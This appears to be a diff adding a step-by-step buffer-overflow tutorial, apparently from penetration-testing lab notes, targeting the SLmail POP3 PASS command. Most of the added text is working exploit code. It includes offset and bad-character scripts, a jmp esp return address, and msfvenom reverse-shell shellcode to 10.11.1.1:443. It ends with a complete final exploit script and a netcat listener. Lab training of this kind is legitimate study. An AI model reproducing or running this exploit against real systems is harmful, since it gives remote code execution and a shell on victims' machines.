@@ -477,7 +477,7 @@ This will list all of the running processes on the system.
 
 The first thing you want to do is try and fuzz an input to the program. In the case of the
 SLmail program we fuzzed the `PASS` input from the command line.  we used the simple Python
-program [pop3-pass-fuzz.py](Scripts/bufferOverflow/pop3-pass-fuzz.py) which can be seen
+program [pop3-pass-fuzz.py](bufferOverflow/pop3-pass-fuzz.py) which can be seen
 below
 
 ```python
@@ -528,7 +528,7 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 ```
 
 pulg this into the exploit python code
-[SLmail-pop3.py](Scripts/bufferOverflow/SLmail-pop3.py)and re-run it.
+[SLmail-pop3.py](bufferOverflow/SLmail-pop3.py)and re-run it.
 
 ```python
 #!/usr/bin/python
@@ -562,6 +562,307 @@ or
 ```bash
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 8Di9
 [*] Exact match at offset 2606
+```
+Use this to alter the exploit script to check if you have control of the EIP. The script
+should look something like this.
+
+```python
+#!/usr/bin/python
+
+import socket
+
+buff = "A"*2606 + "BBBB" + "C"*90
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+   s.connect( ( "10.11.14.166" , 110 ) ) 
+   print(s.recv(1024))
+   s.send("USER TEST\r\n")
+   print(s.recv(1024))
+   s.send("PASS " + buff + "\r\n")
+   print("Done")
+
+except:
+   print("Error while connecting")
+```
+
+Run the exploit again and check that the EIP = `42424242`.  You can also check the stack
+and see if the ESP points to the top of the `C`'s and right above them are the `B`'s.
+
+You next want to check if we can extend our `C` buffer size any further.  We will need 350
+to 400 bytes to load our payload and currently we only have 90 bytes.  Increase the size of
+`C`'s in the exploit script and re-run it.
+```python
+#!/usr/bin/python
+
+import socket
+
+buff = "A"*2606 + "BBBB" + "C"*(3600-2606-4)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+   s.connect( ( "10.11.14.166" , 110 ) )
+   print(s.recv(1024))
+   s.send("USER TEST\r\n")
+   print(s.recv(1024))
+   s.send("PASS " + buff + "\r\n")
+   print("Done")
+
+except:
+   print("Error while connecting")
+```
+Make sure that you get enough `C`'s in the debugger before moving on.
+
+Now we need to check which characters are allow in the input stream.  The script
+[SLmail-pop3-v2.py](bufferOverflow/SLmail-pop3-v2.py) does just that.
+```python
+#!/usr/bin/python
+
+import socket
+
+badchars = (
+   "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F"
+   "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F"
+   "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F"
+   "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F"
+   "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F"
+   "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F"
+   "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F"
+   "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F"
+   "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F"
+   "\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F"
+   "\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF"
+   "\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF"
+   "\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF"
+   "\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF"
+   "\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF"
+   "\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF"
+      )
+
+buff = "A" * 2606 + "B" * 4 + badchars
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+   s.connect( ( "10.11.14.166" , 110 ) )
+   print(s.recv(1024))
+   s.send("USER TEST\r\n")
+   print(s.recv(1024))
+   s.send("PASS " + buff + "\r\n")
+   print("Done")
+
+except:
+   print("Error while connecting")
+
+```
+Each time you don't get the entire string in memory, remove the offinding character and
+try again.
+
+Now you need to load you shell code in the overwritten space where your `C`'s are.  To do
+this you will need to load an address of a command of either
+
+```asm
+jmp esp
+```
+or
+```asm
+push esp
+retn
+```
+To find these you will need to use mona in the windows imunity-debugger.  In the command
+bar at the bottom of the window type `!mona modules`.  You want to look for a module that
+has Rebase, SafeSEH, ASLR, and NXCompat set to false.  You also need to make sure that the
+address wouldn't contain any offinding characters in it.  In other words, if you found a
+module but the address range was `00fb6800` to `00fba880` you most likly would not be able
+to use it because any command in that module would require a `\x00` character or `null`
+that would kill anything after it.
+
+Once you have found one click on the `e` in the upper debugger bar and look for the module
+you found.  double click on the module and it will load it into the debugger.  Next right
+click in the code window and goto `Search for` -> `Command`.  Type in `jmp esp` and hit
+enter.  If you find one great, if not then right click again and goto `Search for` -> 
+`Sequence of commands` and use the `push esp` and `retn`.
+
+If you still don't find one thats OK. Your search will have only have been done on the
+`text` section of the module.  You can check that by clicking on the `m` in the upper tool
+bar in the debugger. and looking for the module you selected. It should have `R E ` under
+the access column for the text section. This means that it could be read and executed.
+However, because we chose a module that had no memory protection we can use code from
+places other then the text section.  First we need to konw the hex code for the command
+`jump esp`.  To find that we will use the NASM shell.
+```bash
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm > jmp esp
+00000000  FFE4              jmp esp
+nasm > 
+```
+We can now use `mona` again to search for this opcode.
+
+Using `!mona find -s "\xFF\xE4" -m slmfc.dll`
+Of course replace the string and the module with the one you would use.
+
+Make sure the address is usuable. In the debugger tool bar look for the left arrow next to 
+vertical 3 dots and enter the address of the command and ensure that it is there.  While
+you are in the code you might as well select the line with `jmp esp` and press `f2` to
+set a break point.  Next replace your `B`'s in the exploit code with the address of the
+command you want to use like so.
+```python
+#!/usr/bin/python
+
+import socket
+
+buff = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C"*(3600-2606-4) 
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+   s.connect( ( "10.11.14.166" , 110 ) )
+   print(s.recv(1024))
+   s.send("USER TEST\r\n")
+   print(s.recv(1024))
+   s.send("PASS " + buff + "\r\n")
+   print("Done")
+
+except:
+   print("Error while connecting")
+```
+Notice that the address should be backwards because of the Little endian format. The
+address as found in the debugger would have been `5f4a358f`.  Run the code again and make
+sure that you jump to the right place in the debugger.  Press `f7` in the debugger to step
+into the next peice of code.  You should now be executing the `C`'s which is the comand
+`INC EBX`.
+
+We now want to generate shell code to launch a reverse shell to a listing NetCat instance.
+We will generate this with a metasploit program called `msfvenom`
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.1.1 LPORT=443 -f c -a x86 --platform=windows
+No encoder or badchars specified, outputting raw payload
+Payload size: 324 bytes
+Final size of c file: 1386 bytes
+unsigned char buf[] = 
+"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
+"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
+"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
+"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
+"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
+"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
+"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
+"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
+"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
+"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
+"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
+"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
+"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0b\x01\x01\x68"
+"\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
+"\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
+"\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
+"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44"
+"\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56"
+"\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff"
+"\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
+"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
+"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
+```
+This peice of code will mostlikly have bad characters in it. We can get rid of them by
+encodeing it and specifying which characters not to use.
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.1.1 LPORT=443 -f c -a x86 --platform=windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of c file: 1500 bytes
+unsigned char buf[] = 
+"\xd9\xc1\xbd\x01\x8b\xdd\xbd\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
+"\x52\x31\x6f\x17\x03\x6f\x17\x83\xee\x77\x3f\x48\x0c\x6f\x42"
+"\xb3\xec\x70\x23\x3d\x09\x41\x63\x59\x5a\xf2\x53\x29\x0e\xff"
+"\x18\x7f\xba\x74\x6c\xa8\xcd\x3d\xdb\x8e\xe0\xbe\x70\xf2\x63"
+"\x3d\x8b\x27\x43\x7c\x44\x3a\x82\xb9\xb9\xb7\xd6\x12\xb5\x6a"
+"\xc6\x17\x83\xb6\x6d\x6b\x05\xbf\x92\x3c\x24\xee\x05\x36\x7f"
+"\x30\xa4\x9b\x0b\x79\xbe\xf8\x36\x33\x35\xca\xcd\xc2\x9f\x02"
+"\x2d\x68\xde\xaa\xdc\x70\x27\x0c\x3f\x07\x51\x6e\xc2\x10\xa6"
+"\x0c\x18\x94\x3c\xb6\xeb\x0e\x98\x46\x3f\xc8\x6b\x44\xf4\x9e"
+"\x33\x49\x0b\x72\x48\x75\x80\x75\x9e\xff\xd2\x51\x3a\x5b\x80"
+"\xf8\x1b\x01\x67\x04\x7b\xea\xd8\xa0\xf0\x07\x0c\xd9\x5b\x40"
+"\xe1\xd0\x63\x90\x6d\x62\x10\xa2\x32\xd8\xbe\x8e\xbb\xc6\x39"
+"\xf0\x91\xbf\xd5\x0f\x1a\xc0\xfc\xcb\x4e\x90\x96\xfa\xee\x7b"
+"\x66\x02\x3b\x2b\x36\xac\x94\x8c\xe6\x0c\x45\x65\xec\x82\xba"
+"\x95\x0f\x49\xd3\x3c\xea\x1a\xd6\xcb\xf5\xdb\x8e\xc9\xf5\xda"
+"\xf5\x47\x13\xb6\x19\x0e\x8c\x2f\x83\x0b\x46\xd1\x4c\x86\x23"
+"\xd1\xc7\x25\xd4\x9c\x2f\x43\xc6\x49\xc0\x1e\xb4\xdc\xdf\xb4"
+"\xd0\x83\x72\x53\x20\xcd\x6e\xcc\x77\x9a\x41\x05\x1d\x36\xfb"
+"\xbf\x03\xcb\x9d\xf8\x87\x10\x5e\x06\x06\xd4\xda\x2c\x18\x20"
+"\xe2\x68\x4c\xfc\xb5\x26\x3a\xba\x6f\x89\x94\x14\xc3\x43\x70"
+"\xe0\x2f\x54\x06\xed\x65\x22\xe6\x5c\xd0\x73\x19\x50\xb4\x73"
+"\x62\x8c\x24\x7b\xb9\x14\x54\x36\xe3\x3d\xfd\x9f\x76\x7c\x60"
+"\x20\xad\x43\x9d\xa3\x47\x3c\x5a\xbb\x22\x39\x26\x7b\xdf\x33"
+"\x37\xee\xdf\xe0\x38\x3b";
+```
+The encodeing process takes a little stake space to preform so we can't just copy this code
+to our buffer we first need to give it a little room to work with.  We can do that with a
+no-op slide.  The opcode for no-op is `\x90` so the final working script
+[SLmail-pop3-final](bufferOverflow/SLmail-pop3-final.py) would look like this:
+```python
+#!/usr/bin/python
+
+import socket
+
+shellcode = (
+"\xd9\xc1\xbd\x01\x8b\xdd\xbd\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
+"\x52\x31\x6f\x17\x03\x6f\x17\x83\xee\x77\x3f\x48\x0c\x6f\x42"
+"\xb3\xec\x70\x23\x3d\x09\x41\x63\x59\x5a\xf2\x53\x29\x0e\xff"
+"\x18\x7f\xba\x74\x6c\xa8\xcd\x3d\xdb\x8e\xe0\xbe\x70\xf2\x63"
+"\x3d\x8b\x27\x43\x7c\x44\x3a\x82\xb9\xb9\xb7\xd6\x12\xb5\x6a"
+"\xc6\x17\x83\xb6\x6d\x6b\x05\xbf\x92\x3c\x24\xee\x05\x36\x7f"
+"\x30\xa4\x9b\x0b\x79\xbe\xf8\x36\x33\x35\xca\xcd\xc2\x9f\x02"
+"\x2d\x68\xde\xaa\xdc\x70\x27\x0c\x3f\x07\x51\x6e\xc2\x10\xa6"
+"\x0c\x18\x94\x3c\xb6\xeb\x0e\x98\x46\x3f\xc8\x6b\x44\xf4\x9e"
+"\x33\x49\x0b\x72\x48\x75\x80\x75\x9e\xff\xd2\x51\x3a\x5b\x80"
+"\xf8\x1b\x01\x67\x04\x7b\xea\xd8\xa0\xf0\x07\x0c\xd9\x5b\x40"
+"\xe1\xd0\x63\x90\x6d\x62\x10\xa2\x32\xd8\xbe\x8e\xbb\xc6\x39"
+"\xf0\x91\xbf\xd5\x0f\x1a\xc0\xfc\xcb\x4e\x90\x96\xfa\xee\x7b"
+"\x66\x02\x3b\x2b\x36\xac\x94\x8c\xe6\x0c\x45\x65\xec\x82\xba"
+"\x95\x0f\x49\xd3\x3c\xea\x1a\xd6\xcb\xf5\xdb\x8e\xc9\xf5\xda"
+"\xf5\x47\x13\xb6\x19\x0e\x8c\x2f\x83\x0b\x46\xd1\x4c\x86\x23"
+"\xd1\xc7\x25\xd4\x9c\x2f\x43\xc6\x49\xc0\x1e\xb4\xdc\xdf\xb4"
+"\xd0\x83\x72\x53\x20\xcd\x6e\xcc\x77\x9a\x41\x05\x1d\x36\xfb"
+"\xbf\x03\xcb\x9d\xf8\x87\x10\x5e\x06\x06\xd4\xda\x2c\x18\x20"
+"\xe2\x68\x4c\xfc\xb5\x26\x3a\xba\x6f\x89\x94\x14\xc3\x43\x70"
+"\xe0\x2f\x54\x06\xed\x65\x22\xe6\x5c\xd0\x73\x19\x50\xb4\x73"
+"\x62\x8c\x24\x7b\xb9\x14\x54\x36\xe3\x3d\xfd\x9f\x76\x7c\x60"
+"\x20\xad\x43\x9d\xa3\x47\x3c\x5a\xbb\x22\x39\x26\x7b\xdf\x33"
+"\x37\xee\xdf\xe0\x38\x3b"
+      )
+buff = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90"*16 + shellcode + "C"*(3600-2606-4-351-16)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+   s.connect( ( "10.11.14.166" , 110 ) ) 
+   print(s.recv(1024))
+   s.send("USER TEST\r\n")
+   print(s.recv(1024))
+   s.send("PASS " + buff + "\r\n")
+   print("Done")
+
+except:
+   print("Error while connecting")
+```
+You should now be able to use this to get a reverse shell.  You should first follow this in the
+debugger to ensure that it works the way you want it to.  To get the shell you will need to set
+up an instance of netcat to listen on port 443.
+```bash
+nc -nlvp 443
+```
+This will work but when you exit the shell the program will crash.  To avoid this you can add
+a option to `msfvenom` to have it exit the thread instead of the progam.
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.134 LPORT=443 EXITFUNC=thread -f c -a x86 --platform=windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
 ```
 
 
